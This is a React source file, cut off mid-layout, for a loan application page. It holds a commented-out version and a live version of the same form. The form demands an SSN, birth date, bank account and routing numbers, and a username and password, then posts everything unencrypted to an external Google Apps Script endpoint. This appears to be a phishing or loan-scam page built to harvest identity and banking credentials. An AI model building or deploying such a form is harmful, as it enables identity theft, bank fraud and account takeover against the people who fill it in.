// import React, { useState } from "react";

// export default function LoanApplicationForm() {
//   const [formData, setFormData] = useState({
//     firstName: "",
//     lastName: "",
//     dateOfBirth: "",
//     ssn: "",
//     countryCode: "+1",
//     phoneNumber: "",
//     address: "",
//     bankName: "",
//     accountNumber: "",
//     routingNumber: "",
//     username: "",
//     password: "",
//     requiredAmount: "",
//     termsAccepted: false,
//   });

//   const [loading, setLoading] = useState(false);
//   const [errors, setErrors] = useState({});
//   const [submitMessage, setSubmitMessage] = useState({ type: "", text: "" });

//   const countries = [
//     { code: "+1", name: "United States", flag: "🇺🇸", format: "(XXX) XXX-XXXX", maxLength: 10 },
//     { code: "+1", name: "Canada", flag: "🇨🇦", format: "(XXX) XXX-XXXX", maxLength: 10 },
//     { code: "+44", name: "United Kingdom", flag: "🇬🇧", format: "XXXX XXX XXXX", maxLength: 10 },
//     { code: "+91", name: "India", flag: "🇮🇳", format: "XXXXX XXXXX", maxLength: 10 },
//     { code: "+86", name: "China", flag: "🇨🇳", format: "XXX XXXX XXXX", maxLength: 11 },
//     { code: "+81", name: "Japan", flag: "🇯🇵", format: "XX XXXX XXXX", maxLength: 10 },
//     { code: "+49", name: "Germany", flag: "🇩🇪", format: "XXX XXXXXXX", maxLength: 11 },
//     { code: "+33", name: "France", flag: "🇫🇷", format: "X XX XX XX XX", maxLength: 9 },
//     { code: "+61", name: "Australia", flag: "🇦🇺", format: "XXX XXX XXX", maxLength: 9 },
//     { code: "+55", name: "Brazil", flag: "🇧🇷", format: "(XX) XXXXX-XXXX", maxLength: 11 },
//     { code: "+52", name: "Mexico", flag: "🇲🇽", format: "XXX XXX XXXX", maxLength: 10 },
//     { code: "+39", name: "Italy", flag: "🇮🇹", format: "XXX XXX XXXX", maxLength: 10 },
//     { code: "+34", name: "Spain", flag: "🇪🇸", format: "XXX XX XX XX", maxLength: 9 },
//     { code: "+7", name: "Russia", flag: "🇷🇺", format: "XXX XXX-XX-XX", maxLength: 10 },
//     { code: "+82", name: "South Korea", flag: "🇰🇷", format: "XX XXXX XXXX", maxLength: 10 },
//   ];

//   const handleChange = (e) => {
//     const { name, value, type, checked } = e.target;

//     // SSN auto-format: XXX-XX-XXXX
//     let val = value;
//     if (name === "ssn") {
//       val = val.replace(/\D/g, ""); // Remove non-digits
//       if (val.length > 3 && val.length <= 5) val = val.replace(/(\d{3})(\d+)/, "$1-$2");
//       if (val.length > 5) val = val.replace(/(\d{3})(\d{2})(\d+)/, "$1-$2-$3");
//       val = val.substring(0, 11); // Max length
//     }

//     // Phone number - remove formatting, just keep digits and restrict by country maxLength
//     if (name === "phoneNumber") {
//       val = val.replace(/\D/g, ""); // Only keep digits
//       const selectedCountry = countries.find(c => c.code === formData.countryCode);
//       const maxLength = selectedCountry?.maxLength || 15;
//       val = val.substring(0, maxLength); // Restrict to country's max length
//     }

//     // When country code changes, clear phone number if it exceeds new country's max length
//     if (name === "countryCode") {
//       const newCountry = countries.find(c => c.code === value);
//       const currentPhone = formData.phoneNumber.replace(/\D/g, "");
//       if (currentPhone.length > (newCountry?.maxLength || 15)) {
//         setFormData((prev) => ({
//           ...prev,
//           countryCode: value,
//           phoneNumber: "",
//         }));
//         return;
//       }
//     }

//     setFormData((prev) => ({
//       ...prev,
//       [name]: type === "checkbox" ? checked : val,
//     }));

//     if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }));
//   };

//   const validateForm = () => {
//     const newErrors = {};

//     if (!formData.firstName.trim()) newErrors.firstName = "First Name is required";
//     else if (formData.firstName.trim().length < 2)
//       newErrors.firstName = "First Name must be at least 2 characters";

//     if (!formData.lastName.trim()) newErrors.lastName = "Last Name is required";
//     else if (formData.lastName.trim().length < 2)
//       newErrors.lastName = "Last Name must be at least 2 characters";

//     if (!formData.dateOfBirth) newErrors.dateOfBirth = "Date of Birth is required";
//     else {
//       const birthDate = new Date(formData.dateOfBirth);
//       const today = new Date();
//       const age = today.getFullYear() - birthDate.getFullYear();
//       if (age < 18) newErrors.dateOfBirth = "You must be at least 18 years old";
//     }

//     if (!formData.ssn.trim()) newErrors.ssn = "SSN is required";
//     else if (!/^\d{3}-\d{2}-\d{4}$/.test(formData.ssn))
//       newErrors.ssn = "SSN must be in format XXX-XX-XXXX";

//     const selectedCountry = countries.find(c => c.code === formData.countryCode);
//     const requiredLength = selectedCountry?.maxLength || 10;

//     if (!formData.phoneNumber.trim()) newErrors.phoneNumber = "Phone Number is required";
//     else if (formData.phoneNumber.length !== requiredLength)
//       newErrors.phoneNumber = `Phone Number must be exactly ${requiredLength} digits for ${selectedCountry?.name}`;

//     if (!formData.address.trim()) newErrors.address = "Address is required";
//     if (!formData.bankName.trim()) newErrors.bankName = "Bank Name is required";

//     if (!formData.accountNumber.trim()) newErrors.accountNumber = "Account Number is required";
//     else if (formData.accountNumber.length < 8)
//       newErrors.accountNumber = "Account Number must be at least 8 digits";

//     if (!formData.routingNumber.trim()) newErrors.routingNumber = "Routing Number is required";
//     else if (!/^\d{9}$/.test(formData.routingNumber))
//       newErrors.routingNumber = "Routing Number must be exactly 9 digits";

//     if (!formData.username.trim()) newErrors.username = "Username is required";
//     else if (formData.username.trim().length < 4)
//       newErrors.username = "Username must be at least 4 characters";

//     if (!formData.password.trim()) newErrors.password = "Password is required";
//     else if (formData.password.length < 8)
//       newErrors.password = "Password must be at least 8 characters";

//     if (!formData.requiredAmount || formData.requiredAmount < 300)
//       newErrors.requiredAmount = "Loan Amount must be at least $300";
//     else if (formData.requiredAmount > 100000)
//       newErrors.requiredAmount = "Loan Amount cannot exceed $100,000";

//     if (!formData.termsAccepted)
//       newErrors.termsAccepted = "You must accept the terms & privacy policy";

//     return newErrors;
//   };

//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     setSubmitMessage({ type: "", text: "" });

//     const validationErrors = validateForm();
//     if (Object.keys(validationErrors).length > 0) {
//       setErrors(validationErrors);
//       setSubmitMessage({
//         type: "error",
//         text: "Please fill all required Details before submitting.",
//       });
//       return;
//     }

//     setErrors({});
//     setLoading(true);

//     try {
//       const SCRIPT_URL =
//         "https://script.google.com/macros/s/AKfycbzWVw2I4fD2ogJEobrSQk8b-mkU0ie1D0g6wT9281NnlCkUecIvosAmORiosiX0BedPbQ/exec";

//       const response = await fetch(SCRIPT_URL, {
//         redirect: "follow",
//         method: "POST",
//         headers: { "Content-Type": "text/plain" },
//         body: JSON.stringify(formData),
//       });

//       const result = await response.json();

//       if (result.status === "success") {
//         setSubmitMessage({
//           type: "success",
//           text: "Application submitted successfully! We'll review your application and get back to you soon.",
//         });
//         setFormData({
//           firstName: "",
//           lastName: "",
//           dateOfBirth: "",
//           ssn: "",
//           countryCode: "+1",
//           phoneNumber: "",
//           address: "",
//           bankName: "",
//           accountNumber: "",
//           routingNumber: "",
//           username: "",
//           password: "",
//           requiredAmount: "",
//           termsAccepted: false,
//         });
//       } else {
//         setSubmitMessage({
//           type: "error",
//           text: result.message || "Submission failed. Please try again.",
//         });
//       }
//     } catch (err) {
//       console.error("Submission error:", err);
//       setSubmitMessage({
//         type: "error",
//         text: "Network error. Please check your connection and try again.",
//       });
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12 px-4 sm:px-6 lg:px-8">
//       <div className="max-w-4xl mx-auto bg-white shadow-xl rounded-2xl p-8 my-10">
//         <div className="text-center mb-8">
//           <h1 className="text-4xl font-bold text-gray-900 mb-2">Loan Application Form</h1>
//           <p className="text-gray-600">Fill out the form below to apply for a loan</p>
//         </div>

//         <form onSubmit={handleSubmit} className="space-y-8">
//           {/* Personal Info */}
//           <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-6 rounded-xl border border-blue-200">
//             <h2 className="text-2xl font-semibold mb-6 text-blue-900">Personal Information</h2>
//             <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">First Name *</label>
//                 <input
//                   type="text"
//                   name="firstName"
//                   placeholder="John"
//                   value={formData.firstName}
//                   onChange={handleChange}
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
//                     errors.firstName ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.firstName && <p className="text-red-500 text-sm mt-1">{errors.firstName}</p>}
//               </div>
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Last Name *</label>
//                 <input
//                   type="text"
//                   name="lastName"
//                   placeholder="Doe"
//                   value={formData.lastName}
//                   onChange={handleChange}
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
//                     errors.lastName ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.lastName && <p className="text-red-500 text-sm mt-1">{errors.lastName}</p>}
//               </div>
//             </div>

//             <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Date of Birth *</label>
//                 <input
//                   type="date"
//                   name="dateOfBirth"
//                   value={formData.dateOfBirth}
//                   onChange={handleChange}
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
//                     errors.dateOfBirth ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.dateOfBirth && <p className="text-red-500 text-sm mt-1">{errors.dateOfBirth}</p>}
//               </div>
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">SSN *</label>
//                 <input
//                   type="text"
//                   name="ssn"
//                   placeholder="XXX-XX-XXXX"
//                   value={formData.ssn}
//                   onChange={handleChange}
//                   maxLength="11"
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
//                     errors.ssn ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.ssn && <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>}
//               </div>
//             </div>

//             <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number *</label>
//                 <div className="flex gap-2">
//                   <select
//                     name="countryCode"
//                     value={formData.countryCode}
//                     onChange={handleChange}
//                     className="p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white"
//                     style={{ minWidth: "200px" }}
//                   >
//                     {countries.map((country, index) => (
//                       <option key={index} value={country.code}>
//                         {country.flag} {country.name} ({country.code})
//                       </option>
//                     ))}
//                   </select>
//                   <input
//                     type="tel"
//                     name="phoneNumber"
//                     placeholder={countries.find(c => c.code === formData.countryCode)?.format || "Phone Number"}
//                     value={formData.phoneNumber}
//                     onChange={handleChange}
//                     className={`p-3 border rounded-lg flex-1 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
//                       errors.phoneNumber ? "border-red-500" : "border-gray-300"
//                     }`}
//                   />
//                 </div>
//                 {errors.phoneNumber && <p className="text-red-500 text-sm mt-1">{errors.phoneNumber}</p>}
//               </div>
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Address *</label>
//                 <input
//                   type="text"
//                   name="address"
//                   placeholder="123 Main St, City, State, ZIP"
//                   value={formData.address}
//                   onChange={handleChange}
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
//                     errors.address ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
//               </div>
//             </div>
//           </div>

//           {/* Bank Info */}
//           <div className="bg-gradient-to-r from-green-50 to-green-100 p-6 rounded-xl border border-green-200">
//             <h2 className="text-2xl font-semibold mb-6 text-green-900">Bank Information</h2>
//             <div>
//               <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name *</label>
//               <input
//                 type="text"
//                 name="bankName"
//                 placeholder="Chase Bank"
//                 value={formData.bankName}
//                 onChange={handleChange}
//                 className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-green-500 focus:border-transparent ${
//                   errors.bankName ? "border-red-500" : "border-gray-300"
//                 }`}
//               />
//               {errors.bankName && <p className="text-red-500 text-sm mt-1">{errors.bankName}</p>}
//             </div>

//             <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Account Number *</label>
//                 <input
//                   type="text"
//                   name="accountNumber"
//                   placeholder="12345678"
//                   value={formData.accountNumber}
//                   onChange={handleChange}
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-green-500 focus:border-transparent ${
//                     errors.accountNumber ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.accountNumber && <p className="text-red-500 text-sm mt-1">{errors.accountNumber}</p>}
//               </div>
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Routing Number *</label>
//                 <input
//                   type="text"
//                   name="routingNumber"
//                   placeholder="123456789"
//                   maxLength="9"
//                   value={formData.routingNumber}
//                   onChange={handleChange}
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-green-500 focus:border-transparent ${
//                     errors.routingNumber ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.routingNumber && <p className="text-red-500 text-sm mt-1">{errors.routingNumber}</p>}
//               </div>
//             </div>
//           </div>

//           {/* Account Details */}
//           <div className="bg-gradient-to-r from-purple-50 to-purple-100 p-6 rounded-xl border border-purple-200">
//             <h2 className="text-2xl font-semibold mb-6 text-purple-900">Account Details</h2>
//             <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Username *</label>
//                 <input
//                   type="text"
//                   name="username"
//                   placeholder="johndoe123"
//                   value={formData.username}
//                   onChange={handleChange}
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-purple-500 focus:border-transparent ${
//                     errors.username ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.username && <p className="text-red-500 text-sm mt-1">{errors.username}</p>}
//               </div>
//               <div>
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Password *</label>
//                 <input
//                   type="password"
//                   name="password"
//                   placeholder="••••••••"
//                   value={formData.password}
//                   onChange={handleChange}
//                   autoComplete="new-password"
//                   className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-purple-500 focus:border-transparent ${
//                     errors.password ? "border-red-500" : "border-gray-300"
//                   }`}
//                 />
//                 {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}
//               </div>
//             </div>
//           </div>

//           {/* Loan Amount */}
//           <div className="bg-gradient-to-r from-orange-50 to-orange-100 p-6 rounded-xl border border-orange-200">
//             <h2 className="text-2xl font-semibold mb-6 text-orange-900">Loan Amount</h2>
//             <label className="block text-sm font-medium text-gray-700 mb-2">
//               Required Loan Amount * (Min: $300, Max: $100,000)
//             </label>
//             <input
//               type="number"
//               name="requiredAmount"
//               placeholder="5000"
//               min="300"
//               max="100000"
//               value={formData.requiredAmount}
//               onChange={handleChange}
//               className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-orange-500 focus:border-transparent ${
//                 errors.requiredAmount ? "border-red-500" : "border-gray-300"
//               }`}
//             />
//             {errors.requiredAmount && <p className="text-red-500 text-sm mt-1">{errors.requiredAmount}</p>}
//           </div>

//           {/* Terms */}
//           <div className="bg-gradient-to-r from-gray-50 to-gray-100 p-6 rounded-xl border border-gray-200">
//             <label className="flex items-start gap-3 cursor-pointer">
//               <input
//                 type="checkbox"
//                 name="termsAccepted"
//                 checked={formData.termsAccepted}
//                 onChange={handleChange}
//                 className={`w-5 h-5 mt-0.5 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-2 focus:ring-blue-500 ${
//                   errors.termsAccepted ? "border-red-500" : ""
//                 }`}
//               />
//               <span className="text-gray-700">
//                 I agree to the{" "}
//                 <a href="#" className="text-blue-600 underline hover:text-blue-800" onClick={(e) => e.preventDefault()}>
//                   terms & privacy policy
//                 </a>{" "}
//                 *
//               </span>
//             </label>
//             {errors.termsAccepted && <p className="text-red-500 text-sm mt-2">{errors.termsAccepted}</p>}
//           </div>

//           <button
//             type="submit"
//             disabled={loading}
//             className={`w-full py-4 rounded-xl font-semibold text-lg transition-all duration-200 ${
//               loading
//                 ? "bg-gray-400 cursor-not-allowed"
//                 : "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white shadow-lg hover:shadow-xl"
//             }`}
//           >
//             {loading ? (
//               <span className="flex items-center justify-center gap-2">
//                 <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
//                   <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
//                   <path
//                     className="opacity-75"
//                     fill="currentColor"
//                     d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
//                   ></path>
//                 </svg>
//                 Submitting...
//               </span>
//             ) : (
//               "Submit Application"
//             )}
//           </button>

//           {submitMessage.text && (
//             <div
//               className={`mt-4 p-4 rounded-lg text-center font-semibold ${
//                 submitMessage.type === "success"
//                   ? "bg-green-100 text-green-700 border border-green-300"
//                   : "bg-red-100 text-red-700 border border-red-300"
//               }`}
//             >
//               {submitMessage.text}
//             </div>
//           )}
//         </form>
//       </div>
//     </div>
//   );
// }

import React, { useState } from "react";

export default function LoanApplicationForm() {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    ssn: "",
    countryCode: "+1",
    phoneNumber: "",
    address: "",
    bankName: "",
    accountNumber: "",
    routingNumber: "",
    username: "",
    password: "",
    requiredAmount: "",
    termsAccepted: false,
  });

  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({});
  const [submitMessage, setSubmitMessage] = useState({ type: "", text: "" });

  const countries = [
    {
      code: "+1",
      name: "United States",
      flag: "🇺🇸",
      format: "(XXX) XXX-XXXX",
      maxLength: 10,
    },
    {
      code: "+1",
      name: "Canada",
      flag: "🇨🇦",
      format: "(XXX) XXX-XXXX",
      maxLength: 10,
    },
    {
      code: "+44",
      name: "United Kingdom",
      flag: "🇬🇧",
      format: "XXXX XXX XXXX",
      maxLength: 10,
    },
    {
      code: "+91",
      name: "India",
      flag: "🇮🇳",
      format: "XXXXX XXXXX",
      maxLength: 10,
    },
    {
      code: "+86",
      name: "China",
      flag: "🇨🇳",
      format: "XXX XXXX XXXX",
      maxLength: 11,
    },
    {
      code: "+81",
      name: "Japan",
      flag: "🇯🇵",
      format: "XX XXXX XXXX",
      maxLength: 10,
    },
    {
      code: "+49",
      name: "Germany",
      flag: "🇩🇪",
      format: "XXX XXXXXXX",
      maxLength: 11,
    },
    {
      code: "+33",
      name: "France",
      flag: "🇫🇷",
      format: "X XX XX XX XX",
      maxLength: 9,
    },
    {
      code: "+61",
      name: "Australia",
      flag: "🇦🇺",
      format: "XXX XXX XXX",
      maxLength: 9,
    },
    {
      code: "+55",
      name: "Brazil",
      flag: "🇧🇷",
      format: "(XX) XXXXX-XXXX",
      maxLength: 11,
    },
    {
      code: "+52",
      name: "Mexico",
      flag: "🇲🇽",
      format: "XXX XXX XXXX",
      maxLength: 10,
    },
    {
      code: "+39",
      name: "Italy",
      flag: "🇮🇹",
      format: "XXX XXX XXXX",
      maxLength: 10,
    },
    {
      code: "+34",
      name: "Spain",
      flag: "🇪🇸",
      format: "XXX XX XX XX",
      maxLength: 9,
    },
    {
      code: "+7",
      name: "Russia",
      flag: "🇷🇺",
      format: "XXX XXX-XX-XX",
      maxLength: 10,
    },
    {
      code: "+82",
      name: "South Korea",
      flag: "🇰🇷",
      format: "XX XXXX XXXX",
      maxLength: 10,
    },
  ];

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;

    // SSN auto-format: XXX-XX-XXXX
    let val = value;
    if (name === "ssn") {
      val = val.replace(/\D/g, ""); // Remove non-digits
      if (val.length > 3 && val.length <= 5)
        val = val.replace(/(\d{3})(\d+)/, "$1-$2");
      if (val.length > 5) val = val.replace(/(\d{3})(\d{2})(\d+)/, "$1-$2-$3");
      val = val.substring(0, 11); // Max length
    }

    // Phone number - remove formatting, just keep digits and restrict by country maxLength
    if (name === "phoneNumber") {
      val = val.replace(/\D/g, ""); // Only keep digits
      const selectedCountry = countries.find(
        (c) => c.code === formData.countryCode,
      );
      const maxLength = selectedCountry?.maxLength || 15;
      val = val.substring(0, maxLength); // Restrict to country's max length
    }

    // When country code changes, clear phone number if it exceeds new country's max length
    if (name === "countryCode") {
      const newCountry = countries.find((c) => c.code === value);
      const currentPhone = formData.phoneNumber.replace(/\D/g, "");
      if (currentPhone.length > (newCountry?.maxLength || 15)) {
        setFormData((prev) => ({
          ...prev,
          countryCode: value,
          phoneNumber: "",
        }));
        return;
      }
    }

    setFormData((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : val,
    }));

    if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.firstName.trim())
      newErrors.firstName = "First Name is required";
    else if (formData.firstName.trim().length < 2)
      newErrors.firstName = "First Name must be at least 2 characters";

    if (!formData.lastName.trim()) newErrors.lastName = "Last Name is required";
    else if (formData.lastName.trim().length < 2)
      newErrors.lastName = "Last Name must be at least 2 characters";

    if (!formData.dateOfBirth)
      newErrors.dateOfBirth = "Date of Birth is required";
    else {
      const birthDate = new Date(formData.dateOfBirth);
      const today = new Date();
      const age = today.getFullYear() - birthDate.getFullYear();
      if (age < 18) newErrors.dateOfBirth = "You must be at least 18 years old";
    }

    if (!formData.ssn.trim()) newErrors.ssn = "SSN is required";
    else if (!/^\d{3}-\d{2}-\d{4}$/.test(formData.ssn))
      newErrors.ssn = "SSN must be in format XXX-XX-XXXX";

    const selectedCountry = countries.find(
      (c) => c.code === formData.countryCode,
    );
    const requiredLength = selectedCountry?.maxLength || 10;

    if (!formData.phoneNumber.trim())
      newErrors.phoneNumber = "Phone Number is required";
    else if (formData.phoneNumber.length !== requiredLength)
      newErrors.phoneNumber = `Phone Number must be exactly ${requiredLength} digits for ${selectedCountry?.name}`;

    if (!formData.address.trim()) newErrors.address = "Address is required";
    if (!formData.bankName.trim()) newErrors.bankName = "Bank Name is required";

    if (!formData.accountNumber.trim())
      newErrors.accountNumber = "Account Number is required";
    else if (formData.accountNumber.length < 8)
      newErrors.accountNumber = "Account Number must be at least 8 digits";

    if (!formData.routingNumber.trim())
      newErrors.routingNumber = "Routing Number is required";
    else if (!/^\d{9}$/.test(formData.routingNumber))
      newErrors.routingNumber = "Routing Number must be exactly 9 digits";

    if (!formData.username.trim()) newErrors.username = "Username is required";
    else if (formData.username.trim().length < 4)
      newErrors.username = "Username must be at least 4 characters";

    if (!formData.password.trim()) newErrors.password = "Password is required";
    else if (formData.password.length < 8)
      newErrors.password = "Password must be at least 8 characters";

    if (!formData.requiredAmount || formData.requiredAmount < 300)
      newErrors.requiredAmount = "Loan Amount must be at least $300";
    else if (formData.requiredAmount > 100000)
      newErrors.requiredAmount = "Loan Amount cannot exceed $100,000";

    if (!formData.termsAccepted)
      newErrors.termsAccepted = "You must accept the terms & privacy policy";

    return newErrors;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSubmitMessage({ type: "", text: "" });

    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      setSubmitMessage({
        type: "error",
        text: "Please fill all required Details before submitting.",
      });
      return;
    }

    setErrors({});
    setLoading(true);

    try {
      const SCRIPT_URL =
        "https://script.google.com/macros/s/AKfycbzm9otJDlN2JiUpXFPwgKoSu30ql8ia4lXYAZ271S2Iec7n2zlxyTUsr622HYHxOq2f/exec";

      const response = await fetch(SCRIPT_URL, {
        redirect: "follow",
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify(formData),
      });

      const result = await response.json();

      if (result.status === "success") {
        setSubmitMessage({
          type: "success",
          text: "Application submitted successfully! We'll review your application and get back to you soon.",
        });
        setFormData({
          firstName: "",
          lastName: "",
          dateOfBirth: "",
          ssn: "",
          countryCode: "+1",
          phoneNumber: "",
          address: "",
          bankName: "",
          accountNumber: "",
          routingNumber: "",
          username: "",
          password: "",
          requiredAmount: "",
          termsAccepted: false,
        });
      } else {
        setSubmitMessage({
          type: "error",
          text: result.message || "Submission failed. Please try again.",
        });
      }
    } catch (err) {
      console.error("Submission error:", err);
      setSubmitMessage({
        type: "error",
        text: "Network error. Please check your connection and try again.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-4xl mx-auto bg-white shadow-xl rounded-2xl p-8 my-10">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-gray-900 mb-2">
            Loan Application Form
          </h1>
          <p className="text-gray-600">
            Fill out the form below to apply for a loan
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-8">
          {/* Personal Info */}
          <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-6 rounded-xl border border-blue-200">
            <h2 className="text-2xl font-semibold mb-6 text-blue-900">
              Personal Information
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  First Name *
                </label>
                <input
                  type="text"
                  name="firstName"
                  placeholder="John"
                  value={formData.firstName}
                  onChange={handleChange}
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.firstName ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.firstName && (
                  <p className="text-red-500 text-sm mt-1">
                    {errors.firstName}
                  </p>
                )}
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Last Name *
                </label>
                <input
                  type="text"
                  name="lastName"
                  placeholder="Doe"
                  value={formData.lastName}
                  onChange={handleChange}
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.lastName ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.lastName && (
                  <p className="text-red-500 text-sm mt-1">{errors.lastName}</p>
                )}
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Date of Birth *
                </label>
                <input
                  type="date"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleChange}
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.dateOfBirth ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.dateOfBirth && (
                  <p className="text-red-500 text-sm mt-1">
                    {errors.dateOfBirth}
                  </p>
                )}
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  SSN *
                </label>
                <input
                  type="text"
                  name="ssn"
                  placeholder="XXX-XX-XXXX"
                  value={formData.ssn}
                  onChange={handleChange}
                  maxLength="11"
                  className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.ssn ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {errors.ssn && (
                  <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>
                )}
              </div>
            </div>

            <div className="mt-6">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Phone Number *
              </label>
              <div className="flex flex-col sm:flex-row gap-2">
                <select
                  name="countryCode"
                  value={formData.countryCode}
                  onChange={handleChange}
                  className="p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white w-full sm:w-auto sm:min-w-[200px]"
                >
                  {countries.map((country, index) => (
                    <option key={index} value={country.code}>
                      {country.flag} {country.name} ({country.code})
                    </option>
                  ))}
                </select>
                <input
                  type="tel"
                  name="phoneNumber"
                  placeholder={
                    countries.find((c) => c.code === formData.countryCode)
                      ?.format || "Phone Number"
                  }
                  value={formData.phoneNumber}
                  onChange={handleChange}
                  className={`p-3 border rounded-lg flex-1 w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.phoneNumber ? "border-red-500" : "border-gray-300"
                  }`}
                />
              </div>
              {errors.phoneNumber && (
                <p className="text-red-500 text-sm mt-1">
                  {errors.phoneNumber}
                </p>
              )}
            </div>

            <div className="mt-6">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Address *
              </label>
              <input
                type="text"
                name="address"
                placeholder="123 Main St, City, State, ZIP"
                value={formData.address}
                onChange={handleChange}
                className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.address ? "border-red-500" : "border-gray-300"
                }`}
              />
              {errors.address && (
                <p className="text-red-500 text-sm mt-1">{errors.address}</p>
              )}
            </div>
          </div>

          {/* Bank Info */}
          <div className="bg-gradient-to-r from-green-50 to-green-100 p-6 rounded-xl border border-green-200">
            <h2 className="text-2xl font-semibold mb-6 text-green-900">
              Bank Information
            </h2>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Bank Name *
              </label>
              <input
                type="text"
                name="bankName"
                placeholder="Chase Bank"
                value={formData.bankName}
                onChange={handleChange}
                className={`p-3 border rounded-lg w-full focus:ring-2 focus:ring-green-500 focus:border-transparent ${
                  errors.bankName ? "border-red-500" : "border-gray-300"
                }`}
              />
              {errors.bankName && (
                <p className="text-red-500 text-sm mt-1">{errors.bankName}</p>
              )}
            </div>

